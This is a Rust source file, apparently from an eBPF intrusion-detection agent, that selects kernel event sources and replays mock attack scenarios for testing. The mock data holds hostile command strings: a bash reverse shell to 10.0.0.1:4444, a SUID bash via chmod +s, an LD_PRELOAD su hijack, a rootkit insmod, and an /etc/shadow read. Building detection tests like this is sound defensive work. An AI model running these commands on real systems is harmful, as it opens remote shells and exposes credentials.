//! 事件源抽象 — 统一 eBPF ring buffer、mock、文件回放的数据获取接口。
//!
//! A6 重构：trait 改 async（next_bytes 返回 Future，避免 perfbuf/inotify 阻塞 tokio reactor）；
//! 删 Sync 约束（RingBuf 是 Send 非 Sync，强加会逼出 Mutex<RingBuf> 损失性能）；
//! 加 SourceKind enum 用于运行时多态与日志区分。

use anyhow::Result;
use async_trait::async_trait;
use ks_core::event::{af, EventHeader, ExecEvent, FileEvent, NetEvent, SignalEvent};

/// 事件源种类。
///
/// 与多 tier eBPF 架构对应：Modern(5.8+ ringbuf) / Legacy(4.x perfbuf) / Ancient(3.10+ BTF backport)。Mock/FileReplay 用于测试与离线分析。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceKind {
    /// 现代 eBPF tier（5.8+，BPF_MAP_TYPE_RINGBUF）
    EbpfModern,
    /// Legacy eBPF tier（4.x，BPF_MAP_TYPE_PERF_EVENT_ARRAY）— Phase B 实现
    EbpfLegacy,
    /// Ancient eBPF tier（3.10.0-1160+ BTF backport，HASH + 手动 LRU）— Phase C 研究性突破
    EbpfAncient,
    /// Ancient NOBTF tier（3.10 stock 内核无 BTF，aya 无法加载，由 C loader sidecar `ks_loader --stream` 子进程加载 .o 文件，Rust 父进程从 stdout 读帧）— Phase E2
    EbpfAncientNoBtf,
    /// Mock 回放（测试/演示/CI 用）
    Mock,
    /// 文件回放（离线 pcap/jsonl 日志重放）— 未来扩展
    FileReplay,
}

impl SourceKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            SourceKind::EbpfModern => "eBPF-Modern (5.8+ ringbuf)",
            SourceKind::EbpfLegacy => "eBPF-Legacy (4.x perfbuf)",
            SourceKind::EbpfAncient => "eBPF-Ancient (3.10+ BTF backport)",
            SourceKind::EbpfAncientNoBtf => "eBPF-Ancient (NOBTF, C loader sidecar)",
            SourceKind::Mock => "Mock 回放",
            SourceKind::FileReplay => "文件回放",
        }
    }
}

/// 统一事件源 trait。
///
/// 设计要点：
/// - `Send` 不 `Sync`：RingBuf<MapData> 是 Send 非 Sync，强加 Sync 会逼出 `Mutex<RingBuf>` 包装每次 lock 损失性能。本架构每事件源由单 task 独占持有，删 Sync 安全。
/// - `async` next_bytes：Phase B 的 perfbuf/FileReplay 可能需 await epoll/AsyncFd，trait 一开始就 async 避免后续破坏性改动。
#[async_trait]
pub trait EventSource: Send {
    /// 取下一条事件字节。Ok(None) 表示暂无数据（非错误，调用方应 sleep）。
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;

    /// 来源种类（用于运行时多态与日志展示）。
    fn kind(&self) -> SourceKind;

    /// 人类可读描述（含 tier、ringbuf 名等细节）。
    fn description(&self) -> &str;

    /// 是否为 mock（用于跳过告警上报等）。
    fn is_mock(&self) -> bool {
        matches!(self.kind(), SourceKind::Mock)
    }
}

// Mock 事件源

pub struct MockEventSource {
    events: Vec<Vec<u8>>,
    cursor: usize,
    loop_mode: bool,
}

impl MockEventSource {
    pub fn new_with_all_scenarios() -> Self {
        let base_ns: u64 = 100_000_000_000;
        let mut events = Vec::new();
        events.extend(Self::reverse_shell_scenario(base_ns));
        events.extend(Self::ransomware_scenario(base_ns + 60_000_000_000));
        events.extend(Self::privilege_escalation_scenario(
            base_ns + 120_000_000_000,
        ));
        events.extend(Self::dns_tunnel_scenario(base_ns + 180_000_000_000));
        events.extend(Self::rootkit_scenario(base_ns + 240_000_000_000));
        events.extend(Self::baseline_scenario(base_ns + 300_000_000_000));
        Self {
            events,
            cursor: 0,
            loop_mode: true,
        }
    }

    pub fn new_with_scenario(scenario: MockScenario) -> Self {
        let base_ns: u64 = 100_000_000_000;
        let events = match scenario {
            MockScenario::ReverseShell => Self::reverse_shell_scenario(base_ns),
            MockScenario::Ransomware => Self::ransomware_scenario(base_ns),
            MockScenario::PrivilegeEscalation => Self::privilege_escalation_scenario(base_ns),
            MockScenario::DnsTunnel => Self::dns_tunnel_scenario(base_ns),
            MockScenario::Rootkit => Self::rootkit_scenario(base_ns),
            MockScenario::Baseline => Self::baseline_scenario(base_ns),
            MockScenario::All => Self::new_with_all_scenarios().events,
        };
        Self {
            events,
            cursor: 0,
            loop_mode: false,
        }
    }

    pub fn with_loop(mut self, loop_mode: bool) -> Self {
        self.loop_mode = loop_mode;
        self
    }
    pub fn remaining(&self) -> usize {
        self.events.len() - self.cursor
    }

    fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 1234, base_ns, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 1234, base_ns + 100_000_000, b"bash", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("10.0.0.1"),
                sport: 54321,
                dport: 4444,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 1234, base_ns + 200_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/shadow"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&make_header(2, 1234, base_ns + 300_000_000, b"bash", 0)),
        ]
    }

    fn ransomware_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 5678;
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"encryptor", 59),
            filename: make_cstr_256("/tmp/encryptor"),
            args: make_cstr_512("/tmp/encryptor --target /home/user/docs"),
        })];
        for (i, fname) in [
            "report.pdf.encrypted",
            "budget.xlsx.encrypted",
            "img001.jpg.encrypted",
            "img002.jpg.encrypted",
        ]
        .iter()
        .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    12,
                    pid,
                    base_ns + (i as u64 + 1) * 50_000_000,
                    b"encryptor",
                    1,
                ),
                filename: make_cstr_256(fname),
                bytes: 102400,
                fd: (i + 3) as i32,
                flags: 1,
            }));
        }
        for (i, fname) in ["report.pdf", "budget.xlsx", "img001.jpg", "img002.jpg"]
            .iter()
            .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    13,
                    pid,
                    base_ns + (i as u64 + 5) * 50_000_000,
                    b"encryptor",
                    87,
                ),
                filename: make_cstr_256(fname),
                bytes: 0,
                fd: 0,
                flags: 0,
            }));
        }
        events.push(encode_struct(&FileEvent {
            header: make_header(12, pid, base_ns + 500_000_000, b"encryptor", 1),
            filename: make_cstr_256("README_FOR_DECRYPT.txt"),
            bytes: 2048,
            fd: 11,
            flags: 1,
        }));
        events
    }

    fn privilege_escalation_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 3456;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"chmod", 59),
                filename: make_cstr_256("/bin/chmod"),
                args: make_cstr_512("chmod +s /bin/bash"),
            }),
            encode_struct(&FileEvent {
                header: make_header(15, pid, base_ns + 100_000_000, b"chmod", 15),
                filename: make_cstr_256("/bin/bash"),
                bytes: 0,
                fd: 0,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/etc/sudoers"),
                bytes: 256,
                fd: 3,
                flags: 1,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, pid + 1, base_ns + 300_000_000, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("LD_PRELOAD=/tmp/malicious.so /bin/su"),
            }),
            encode_struct(&SignalEvent {
                header: make_header(30, pid, base_ns + 400_000_000, b"strace", 101),
                target_pid: 1,
                signal: 0,
            }),
        ]
    }

    fn dns_tunnel_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 7890;
        let dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"dnstunnel", 59),
            filename: make_cstr_256("/tmp/dnstunnel"),
            args: make_cstr_512("dnstunnel --client"),
        })];
        for (i, dns) in dns_servers.iter().enumerate() {
            events.push(encode_struct(&NetEvent {
                header: make_header(
                    24,
                    pid,
                    base_ns + (i as u64 + 1) * 1_000_000_000,
                    b"dnstunnel",
                    0,
                ),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32(dns),
                sport: 12345 + i as u16,
                dport: 53,
                proto: 17,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }));
        }
        events
    }

    fn rootkit_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 9999;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"insmod", 59),
                filename: make_cstr_256("/sbin/insmod"),
                args: make_cstr_512("insmod /tmp/rootkit.ko"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, pid, base_ns + 100_000_000, b"insmod", 2),
                filename: make_cstr_256("/proc/kallsyms"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/boot/grub/grub.cfg"),
                bytes: 4096,
                fd: 4,
                flags: 1,
            }),
            encode_struct(&SignalEvent {
                header: make_header(31, pid, base_ns + 300_000_000, b"bash", 62),
                target_pid: 100,
                signal: 9,
            }),
        ]
    }

    fn baseline_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 5000, base_ns, b"ls", 59),
                filename: make_cstr_256("/bin/ls"),
                args: make_cstr_512("ls -la /home"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 5001, base_ns + 50_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/hosts"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, 5002, base_ns + 100_000_000, b"wget", 59),
                filename: make_cstr_256("/usr/bin/wget"),
                args: make_cstr_512("wget https://example.com/pkg.tar.gz"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 5002, base_ns + 150_000_000, b"wget", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("93.184.216.34"),
                sport: 54322,
                dport: 443,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
        ]
    }
}

#[async_trait]
impl EventSource for MockEventSource {
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>> {
        if self.cursor >= self.events.len() {
            if self.loop_mode {
                self.cursor = 0;
            } else {
                return Ok(None);
            }
        }
        let data = self.events[self.cursor].clone();
        self.cursor += 1;
        Ok(Some(data))
    }
    fn kind(&self) -> SourceKind {
        SourceKind::Mock
    }
    fn description(&self) -> &str {
        "mock 事件源（场景回放）"
    }
    fn is_mock(&self) -> bool {
        true
    }
}

// Linux 真实事件源（aya ring buffer）
// 注意：LinuxEventSource 已简化为 stub。真实 ring buffer 消费在 start.rs 中通过 loader.try_next_event() 直接调用。A7 会用 EbpfModernSource 替换此 stub。

#[cfg(target_os = "linux")]
pub struct LinuxEventSource;

#[cfg(target_os = "linux")]
impl Default for LinuxEventSource {
    fn default() -> Self {
        Self::new()
    }
}

impl LinuxEventSource {
    pub fn new() -> Self {
        Self
    }
}

#[cfg(target_os = "linux")]
#[async_trait]
impl EventSource for LinuxEventSource {
    async fn next_bytes(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        // stub — 真实消费由 start.rs 绕过此 trait 直接调 loader，A7 重构后由 EbpfModernSource 接管。
        Ok(None)
    }
    fn kind(&self) -> SourceKind {
        SourceKind::EbpfModern
    }
    fn description(&self) -> &str {
        "Linux eBPF (stub — A7 替换中)"
    }
    fn is_mock(&self) -> bool {
        false
    }
}

// 辅助函数

fn make_header(event_type: u32, pid: u32, ts: u64, comm: &[u8], nr: i32) -> EventHeader {
    let mut buf = [0u8; 16];
    let len = comm.len().min(16);
    buf[..len].copy_from_slice(&comm[..len]);
    EventHeader {
        event_type,
        _pad1: 0,
        timestamp_ns: ts,
        pid,
        tid: pid,
        uid: if pid < 5000 { 0 } else { 1000 },
        ppid: if pid > 100 { pid / 10 } else { 0 },
        comm: buf,
        syscall_nr: nr,
        _pad2: 0,
        retval: 0,
    }
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    // 与内核 bpf_probe_read_kernel 一致：网络字节序字节直接拷入 u32 字段，Rust 读出是 native-endian，用 from_ne_bytes 匹配内核行为。
    let parts: Vec<u8> = addr
        .split('.')
        .filter_map(|p| p.parse::<u8>().ok())
        .collect();
    if parts.len() == 4 {
        u32::from_ne_bytes([parts[0], parts[1], parts[2], parts[3]])
    } else {
        0
    }
}

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    // 直接从引用拷贝到 Vec，避免 *s 在栈上产生大结构体副本（ExecEvent ~800B）。
    unsafe {
        core::ptr::copy_nonoverlapping(s as *const T as *const u8, data.as_mut_ptr(), size);
    }
    data
}

#[derive(Debug, Clone, Copy)]
pub enum MockScenario {
    ReverseShell,
    Ransomware,
    PrivilegeEscalation,
    DnsTunnel,
    Rootkit,
    Baseline,
    All,
}

// 平台导出

#[cfg(target_os = "linux")]
pub use linux_impl::*;
#[cfg(not(target_os = "linux"))]
pub use mock_only::*;

#[cfg(target_os = "linux")]
mod linux_impl {
    pub use super::{EventSource, MockEventSource, SourceKind};
    use crate::ebpf_perf_source::EbpfPerfSource;
    use crate::ebpf_source::EbpfModernSource;
    use crate::loader::{BpfMapReader, EbpfLoader, MockBpfMapReader};
    use crate::tier_detect::detect_ebpf_tier;
    use std::sync::Arc;

    /// 默认事件源 — 根据内核版本自动选择 eBPF tier。
    ///
    /// Phase E1.2：返回元组 `(Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>)`，第二元素是 BPF map 读取器（加载成功为 LinuxBpfMapReader，fallback mock 为 MockBpfMapReader），供 /api/v1/stats 端点读取 map_stats。
    ///
    /// - 5.8+ → EbpfModernSource（ringbuf，ks_main_modern.o）
    /// - 4.x  → EbpfPerfSource（perfbuf，ks_main_legacy.o）— B6
    /// - 3.10+ → EbpfPerfSource（perfbuf，ks_main_ancient.o）— C5
    /// - 太老/读不到版本 → mock + warning
    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        match detect_ebpf_tier() {
            Some(SourceKind::EbpfModern) => {
                log::info!("[tier-detect] 当前内核支持 Modern tier (5.8+ ringbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfModern).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] eBPF Modern tier 加载成功，{} 个程序已 attach",
                            loader.loaded_probes().len()
                        );
                        // 在 move loader 到 source 之前先取 map_reader
                        let map_reader = loader.map_reader();
                        return (Box::new(EbpfModernSource::new(loader)), map_reader);
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Modern tier 加载失败: {} — fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfLegacy) => {
                log::info!("[tier-detect] 当前内核走 Legacy tier (4.x perfbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfLegacy).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Legacy tier 加载成功，{} 个程序已 attach",
                            loader.loaded_probes().len()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfLegacy)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Legacy tier 加载失败: {} — fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfAncient) => {
                // Ancient+NOBTF 路径优先走 CLoaderSource（ks_loader --stream 子进程）。3.10 stock 内核无 BTF 时 aya（依赖 libbpf 1.0+）通常无法加载，改由 C loader 加载 .o 并把 perfbuf 事件按帧写 stdout。
                if !crate::tier_detect::btf_available() {
                    log::info!("[tier-detect] Ancient tier 无 BTF，尝试 CLoaderSource (ks_loader --stream)");
                    match try_cloader_source().await {
                        Ok((source, map_reader)) => {
                            log::info!("[tier-detect] CLoaderSource 启动成功（NOBTF 研究性突破）");
                            return (Box::new(source), map_reader);
                        }
                        Err(e) => {
                            log::warn!(
                                "[tier-detect] CLoaderSource 启动失败: {} — fallback aya + mock",
                                e
                            );
                        }
                    }
                }
                // aya 加载路径（有 BTF，或 CLoaderSource 失败时 fallback）
                log::info!("[tier-detect] 当前内核走 Ancient tier (3.10+ BTF backport)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfAncient).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Ancient tier 加载成功（研究性突破），{} 个程序已 attach",
                            loader.loaded_probes().len()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfAncient)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Ancient tier 加载失败: {} — fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            _ => {
                log::warn!("[tier-detect] 内核版本无法识别或太老，fallback mock");
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
        }
    }

    /// 尝试启动 CLoaderSource（NOBTF 路径），在 Ancient tier 且内核无 BTF 时调用：
    /// 1. 查找 `ks_loader` 二进制（KS_LOADER_PATH 覆盖 / 内嵌 static 预编释放）
    /// 2. 查找 `ks_main_ancient_nobtf.o`（KS_EBPF_DIR 覆盖 / 内嵌字节码释放）
    /// 3. `CLoaderSource::spawn` 启动子进程并返回事件源
    ///
    /// CLoaderSource 不持有 EbpfLoader，无法提供 BpfMapReader（map 数据在 C loader 子进程内，Rust 父进程访问不到），返回 None — stats 端点显示空 map_stats（NOBTF 是研究性路径，可接受）。
    async fn try_cloader_source() -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        use crate::cloader_source::CLoaderSource;

        // nobtf .o 用硬编码 offset，仅对 3.10.0-1160 编译。release 不匹配则 fail loud，避免在别的 3.10 子版本上加载 wrong-offset .o 产生 silent wrong data。
        if let Err(reason) = crate::tier_detect::nobtf_release_compatible() {
            log::warn!("[cloader] {}", reason);
            anyhow::bail!("{}", reason);
        }

        // 1. 查找 ks_loader 二进制
        let loader_path = find_ks_loader_binary()?;

        // 2. 查找 ks_main_ancient_nobtf.o
        let object_path = find_ancient_nobtf_object()?;

        log::info!(
            "[cloader] spawn ks_loader --stream {} (loader={}, obj={})",
            object_path.display(),
            loader_path.display(),
            object_path.display(),
        );

        // 3. spawn CLoaderSource
        let source = CLoaderSource::spawn(
            loader_path.to_str().expect("loader_path 非 UTF-8"),
            object_path.to_str().expect("object_path 非 UTF-8"),
        )?;

        // 4. CLoaderSource 不持有 EbpfLoader，返回 None — stats 端点显示空 map_stats（NOBTF 路径可接受）
        Ok((source, None))
    }

    /// 把内嵌字节码释放到临时文件并设权限（单二进制部署：运行时从二进制内释放 ks_loader / .o）。
    fn release_to_temp(name: &str, bytes: &[u8], mode: u32) -> anyhow::Result<std::path::PathBuf> {
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;

        let dir = std::env::var_os("TMPDIR")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| std::path::PathBuf::from("/tmp"));
        let path = dir.join(format!("ks-{}-{}.bin", name, std::process::id()));

        let mut f = std::fs::File::create(&path)
            .map_err(|e| anyhow::anyhow!("创建临时文件 {} 失败: {}", path.display(), e))?;
        f.write_all(bytes)
            .map_err(|e| anyhow::anyhow!("写入临时文件 {} 失败: {}", path.display(), e))?;
        drop(f);
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(mode))
            .map_err(|e| anyhow::anyhow!("chmod {} 失败: {}", path.display(), e))?;

        log::debug!(
            "[cloader] 释放内嵌 {} 到 {} ({} bytes, mode {:o})",
            name,
            path.display(),
            bytes.len(),
            mode,
        );
        Ok(path)
    }

    /// 查找 `ks_loader` 二进制路径（nobtf C loader），按以下优先级：
    /// 1. 环境变量 `KS_LOADER_PATH`（调试覆盖）
    /// 2. 从二进制内嵌的 static ks_loader 释放到临时文件（单二进制，去 gcc/PATH 依赖）
    ///
    /// 内嵌 ks_loader 由 build.rs `gcc -static` 预编（libelf+libz+libzstd 静态链接），可在 CentOS 7(glibc 2.17) 运行。编译期未预编则返回 Err（提示设 KS_LOADER_PATH）。
    fn find_ks_loader_binary() -> anyhow::Result<std::path::PathBuf> {
        // 1. 环境变量 KS_LOADER_PATH（调试覆盖）
        if let Ok(p) = std::env::var("KS_LOADER_PATH") {
            let path = std::path::PathBuf::from(&p);
            if path.is_file() {
                log::debug!("[cloader] ks_loader 来自 KS_LOADER_PATH={}", path.display());
                return Ok(path);
            }
            log::warn!("[cloader] KS_LOADER_PATH={} 但文件不存在，改用内嵌", p);
        }

        // 2. 从二进制内嵌 static ks_loader 释放到临时文件（0500 可执行）
        let bytes = crate::loader::ebpf_objects::ks_loader_static().ok_or_else(|| {
            anyhow::anyhow!(
                "二进制内无内嵌 ks_loader（编译期 static 预编失败）；\
                 如需外部指定，设 KS_LOADER_PATH 环境变量"
            )
        })?;
        release_to_temp("ks_loader", bytes, 0o500)
    }

    /// 查找 `ks_main_ancient_nobtf.o`（NOBTF tier eBPF 字节码），按以下优先级：
    /// 1. 环境变量 `KS_EBPF_DIR` + `ks_main_ancient_nobtf.o`（调试覆盖）
    /// 2. 从二进制内嵌字节码释放到临时文件（单二进制，去磁盘 .o 依赖）
    fn find_ancient_nobtf_object() -> anyhow::Result<std::path::PathBuf> {
        const OBJ_NAME: &str = "ks_main_ancient_nobtf.o";

        // 1. 环境变量 KS_EBPF_DIR（调试覆盖）
        if let Ok(dir) = std::env::var("KS_EBPF_DIR") {
            let p = std::path::PathBuf::from(&dir).join(OBJ_NAME);
            if p.is_file() {
                log::debug!("[cloader] {} 来自 KS_EBPF_DIR={}", OBJ_NAME, p.display());
                return Ok(p);
            }
            log::warn!(
                "[cloader] KS_EBPF_DIR={} 但 {} 不存在，改用内嵌",
                dir,
                OBJ_NAME,
            );
        }

        // 2. 从二进制内嵌字节码释放到临时文件（0400 只读，ks_loader 读取即可）
        let bytes =
            crate::loader::ebpf_objects::ebpf_object_for("ancient_nobtf").ok_or_else(|| {
                anyhow::anyhow!(
                    "二进制内无内嵌 {}（编译期 ancient_nobtf tier 未成功编译）；\
                     如需外部指定，设 KS_EBPF_DIR 环境变量",
                    OBJ_NAME,
                )
            })?;
        release_to_temp(OBJ_NAME, bytes, 0o400)
    }
}

#[cfg(not(target_os = "linux"))]
mod mock_only {
    pub use super::{EventSource, MockEventSource};
    use crate::loader::{BpfMapReader, MockBpfMapReader};
    use std::sync::Arc;

    /// 非 Linux 平台返回 mock 事件源 + MockBpfMapReader。
    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        (
            Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
            Some(Arc::new(MockBpfMapReader)),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::aggregator::EventAggregator;

    #[tokio::test(flavor = "current_thread")]
    async fn test_mock_source_decodable() {
        let mut source = MockEventSource::new_with_all_scenarios().with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut n = 0;
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if agg.decode(&bytes).is_ok() {
                n += 1;
            }
        }
        assert!(n > 10);
    }

    #[tokio::test(flavor = "current_thread")]
    async fn test_reverse_shell_scenario() {
        let mut source =
            MockEventSource::new_with_scenario(MockScenario::ReverseShell).with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut events = Vec::new();
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if let Ok(e) = agg.decode(&bytes) {
                events.push(e);
            }
        }
        assert_eq!(events.len(), 4);
        assert_eq!(events[1].dport, Some(4444));
    }

    #[test]
    fn test_ipv4_encoding() {
        assert_eq!(ipv4_to_u32("8.8.8.8"), 0x08080808);
        assert_eq!(ipv4_to_u32("10.0.0.1"), u32::from_ne_bytes([10, 0, 0, 1]));
    }
}
